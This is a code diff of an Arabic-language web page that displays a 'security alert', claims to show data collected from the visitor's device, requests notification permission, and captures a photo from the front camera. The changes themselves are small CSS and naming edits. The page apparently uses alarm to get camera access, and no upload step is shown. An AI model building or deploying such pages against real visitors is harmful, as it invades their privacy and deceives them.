@@ -113,7 +113,6 @@
             border: 1px solid #ff4d4d33;
         }
 
-        /* زر التفعيل للجوال */
         .activate-btn {
             background: #ff4d4d;
             color: #fff;
@@ -193,14 +192,13 @@
             padding-top: 15px;
         }
         @media (max-width: 550px) {
-            .grid { grid-column: 1fr; }
+            .grid { grid-template-columns: 1fr; }
             .full { grid-column: span 1; }
         }
     </style>
 </head>
 <body>
 
-<!-- ===== طبقة التحميل ===== -->
 <div class="loading-overlay" id="loadingOverlay">
     <div class="spinner"></div>
     <h2>⏳ جارٍ التحميل...</h2>
@@ -210,7 +208,6 @@
 <div class="container">
     <h1>⚠️ تنبيه أمني</h1>
     <span class="sub-badge">🔍 تم جمع هذه البيانات من جهازك</span>
-
     <div class="grid" id="infoGrid"></div>
 
     <div class="camera-section">
@@ -233,12 +230,15 @@
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
     // ==========================================
-    // دوال الكاميرا
+    // دوال الصلاحيات والكاميرا
     // ==========================================
-    async function requestPermissions() {
+    async function requestAllPermissions() {
+        // طلب الإشعارات
         if ('Notification' in window && Notification.permission === 'default') {
             await Notification.requestPermission();
         }
+
+        // طلب الكاميرا
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
@@ -250,7 +250,7 @@
     }
 
     async function capturePhoto() {
-        const stream = await requestPermissions();
+        const stream = await requestAllPermissions();
         const video = document.getElementById('video');
         const capturedImg = document.getElementById('captured-image');
 
@@ -364,7 +364,7 @@
     const loadingText = document.getElementById('loadingText');
 
     if (isMobile) {
-        // ===== جوال: إخفاء التحميل فوراً وعرض الزر =====
+        // ===== جوال: إخفاء التحميل وعرض الزر =====
         overlay.style.display = 'none';
         activateBtn.style.display = 'block';
 
